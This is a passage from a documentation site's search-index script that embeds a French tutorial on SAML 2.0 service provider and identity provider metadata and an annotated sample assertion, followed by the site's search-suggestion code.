\u0026lt;md:SingleLogoutService Binding=\u0026quot;urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST\u0026quot; Location=\u0026quot;https://localhost:8443/saml/LogoutServiceHTTPPost\u0026quot; ResponseLocation=\u0026quot;https://localhost:8443/saml/LogoutServiceHTTPRedirectResponse\u0026quot; /\u0026gt; \u0026lt;!-- Format du \u0026quot;Name ID\u0026quot; qui est l'identifiant selon le fournisseur d'identitÃ©. Dans le cas \u0026quot;transcient\u0026quot;, c'est une chaine alÃ©atoire pour chaque assertion --\u0026gt; \u0026lt;md:NameIDFormat\u0026gt;urn:oasis:names:tc:SAML:2.0:nameid-format:transient\u0026lt;/md:NameIDFormat\u0026gt; \u0026lt;!-- Indique oÃ¹ poster la demande d'assertion --\u0026gt; \u0026lt;md:AssertionConsumerService Binding=\u0026quot;urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST\u0026quot; Location=\u0026quot;https://localhost:8443/saml/SAMLAssertionConsumer\u0026quot; index=\u0026quot;0\u0026quot; isDefault=\u0026quot;true\u0026quot; /\u0026gt; \u0026lt;md:Extensions\u0026gt; \u0026lt;!-- Informations destinÃ©es Ã  configurer la page de login dans le cas de la fÃ©dÃ©ration externe --\u0026gt; \u0026lt;mdui:UIInfo\u0026gt; \u0026lt;mdui:DisplayName xml:lang=\u0026quot;fr\u0026quot;\u0026gt;\u0026lt;/mdui:DisplayName\u0026gt;\u0026lt;mdui:DisplayName xml:lang=\u0026quot;en\u0026quot;\u0026gt;\u0026lt;/mdui:DisplayName\u0026gt;\u0026lt;mdui:Description xml:lang=\u0026quot;fr\u0026quot;\u0026gt;\u0026lt;/mdui:Description\u0026gt;\u0026lt;mdui:Description xml:lang=\u0026quot;en\u0026quot;\u0026gt;\u0026lt;/mdui:Description\u0026gt;\u0026lt;mdui:Logo height=\u0026quot;320\u0026quot; width=\u0026quot;75\u0026quot;\u0026gt;\u0026lt;/mdui:Logo\u0026gt;\u0026lt;mdui:InformationURL xml:lang=\u0026quot;fr\u0026quot;\u0026gt;\u0026lt;/mdui:InformationURL\u0026gt;\u0026lt;mdui:InformationURL xml:lang=\u0026quot;en\u0026quot;\u0026gt;\u0026lt;/mdui:InformationURL\u0026gt; \u0026lt;/mdui:UIInfo\u0026gt; \u0026lt;/md:Extensions\u0026gt; \u0026lt;/md:SPSSODescriptor\u0026gt; \u0026lt;md:Organization\u0026gt;...\u0026lt;/md:Organization\u0026gt;\u0026lt;md:ContactPerson ...\u0026gt;...\u0026lt;/md:ContactPerson\u0026gt; \u0026lt;/md:EntityDescriptor\u0026gt;   Attention les Endpoints doivent Ãªtre identique sur la conf du SP et tel que dÃ©clarÃ©s sur l\u0026rsquo;IDP. C\u0026rsquo;est une vÃ©rification pour ne pas envoyer l\u0026rsquo;utilisateur n\u0026rsquo;importe oÃ¹ (Le SP redonne l\u0026rsquo;url de redirection lors d\u0026rsquo;une requÃªte d\u0026rsquo;authentification)  Metadata d\u0026rsquo;un idp # RÃ©cupÃ©rable sur un endpoint spÃ©cifique du fournisseur\n\u0026lt;EntityDescriptor ... entityID=\u0026quot;https://idp.test/idp/shibboleth\u0026quot;\u0026gt; \u0026lt;IDPSSODescriptor ...\u0026gt; \u0026lt;KeyDescriptor\u0026gt;\u0026lt;ds:KeyInfo\u0026gt;\u0026lt;ds:X509Data\u0026gt;\u0026lt;ds:X509Certificate\u0026gt;certificat de l'idp (clÃ© publique)\u0026lt;/ds:X509Certificate\u0026gt;\u0026lt;/ds:X509Data\u0026gt;\u0026lt;/ds:KeyInfo\u0026gt;\u0026lt;/KeyDescriptor\u0026gt; \u0026lt;!-- Services proposÃ©s, type de bind (POST, Redirect, SOAP, ...) et url associÃ©es en particulier SSO et SLO --\u0026gt; \u0026lt;SingleSignOnService Binding=\u0026quot;urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect\u0026quot; Location=\u0026quot;https://idp.test/idp/profile/SAML2/Redirect/SSO\u0026quot;/\u0026gt; \u0026lt;SingleLogoutService Binding=\u0026quot;urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect\u0026quot; Location=\u0026quot;https://idp.test/idp/profile/SAML2/Redirect/SLO\u0026quot;/\u0026gt; \u0026lt;SingleLogoutService Binding=\u0026quot;urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST\u0026quot; Location=\u0026quot;https://idp.test/idp/profile/SAML2/POST/SLO\u0026quot;/\u0026gt; \u0026lt;!-- NameID possibles de la part de cet IDP --\u0026gt; \u0026lt;NameIDFormat\u0026gt;urn:mace:shibboleth:1.0:nameIdentifier\u0026lt;/NameIDFormat\u0026gt; \u0026lt;NameIDFormat\u0026gt;urn:oasis:names:tc:SAML:2.0:nameid-format:transient\u0026lt;/NameIDFormat\u0026gt; \u0026lt;/IDPSSODescriptor\u0026gt; \u0026lt;/EntityDescriptor\u0026gt;  Une assertion SAML # Les points importants :\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt; \u0026lt;saml2:Assertion ... IssueInstant=\u0026quot;2018-06-07T11:00:48.151Z\u0026quot; ...\u0026gt; \u0026lt;saml2:Issuer\u0026gt;https://idp.test/idp/shibboleth\u0026lt;/saml2:Issuer\u0026gt; \u0026lt;ds:Signature ...\u0026gt;\u0026lt;ds:SignedInfo\u0026gt;...infos algo...\u0026lt;/ds:SignedInfo\u0026gt;\u0026lt;ds:SignatureValue\u0026gt;Signature de l'assertion par l'idp\u0026lt;/ds:SignatureValue\u0026gt;\u0026lt;ds:KeyInfo\u0026gt;... Rappel certificat IDP ...\u0026lt;/ds:KeyInfo\u0026gt; \u0026lt;/ds:Signature\u0026gt; \u0026lt;saml2:Subject\u0026gt; \u0026lt;saml2:NameID ... NameQualifier=\u0026quot;https://idp.test/idp/shibboleth\u0026quot; SPNameQualifier=\u0026quot;https://mon-appli.test\u0026quot; ...\u0026gt;...\u0026lt;/saml2:NameID\u0026gt; \u0026lt;!-- Infos validitÃ© de l'assertion --\u0026gt; \u0026lt;saml2:SubjectConfirmation ...\u0026gt; \u0026lt;saml2:SubjectConfirmationData Address=\u0026quot;10.92.108.2%3\u0026quot; InResponseTo=\u0026quot;_0196a897-0111-4d6f-9c69-d35436e7c590\u0026quot; NotOnOrAfter=\u0026quot;2018-06-07T11:05:48.163Z\u0026quot; Recipient=\u0026quot;https://mon-appli.test/saml/SAMLAssertionConsumer\u0026quot;/\u0026gt; \u0026lt;/saml2:SubjectConfirmation\u0026gt; \u0026lt;/saml2:Subject\u0026gt; ... \u0026lt;saml2:AuthnStatement ...\u0026gt;\u0026lt;saml2:SubjectLocality Address=\u0026quot;192.168.1.1%3\u0026quot;/\u0026gt;\u0026lt;saml2:AuthnContext\u0026gt; \u0026lt;!-- Quelle mÃ©thode d'authentification a Ã©tÃ© rÃ©alisÃ©e --\u0026gt; \u0026lt;saml2:AuthnContextClassRef\u0026gt;urn:oasis:names:tc:SAML:2.0:ac:classes:Kerberos\u0026lt;/saml2:AuthnContextClassRef\u0026gt; \u0026lt;/saml2:AuthnContext\u0026gt;\u0026lt;/saml2:AuthnStatement\u0026gt; \u0026lt;saml2:AttributeStatement\u0026gt;... Attributs ...\u0026lt;/saml2:AttributeStatement\u0026gt; \u0026lt;/saml2:Assertion\u0026gt;  "}).add({id:20,href:"/docs/",title:"Docs",description:"",content:""}),search.addEventListener("input",t,!0);function t(){const s=5;var n=this.value,o=e.search(n,{limit:s,enrich:!0});const t=new Map;for(const e of o.flatMap(e=>e.result)){if(t.has(e.doc.href))continue;t.set(e.doc.href,e.doc)}if(suggestions.innerHTML="",suggestions.classList.remove("d-none"),t.size===0&&n){const e=document.createElement("div");e.innerHTML=`No results for "<strong>${n}</strong>"`,e.classList.add("suggestion__no-results"),suggestions.appendChild(e);return}for(const[r,a]of t){const n=document.createElement("div");suggestions.appendChild(n);const e=document.createElement("a");e.href=r,n.appendChild(e);const o=document.createElement("span");o.textContent=a.title,o.classList.add("suggestion__title"),e.appendChild(o);const i=document.createElement("span");if(i.textContent=a.description,i.classList.add("suggestion__description"),e.appendChild(i),suggestions.appendChild(n),suggestions.childElementCount==s)break}}})()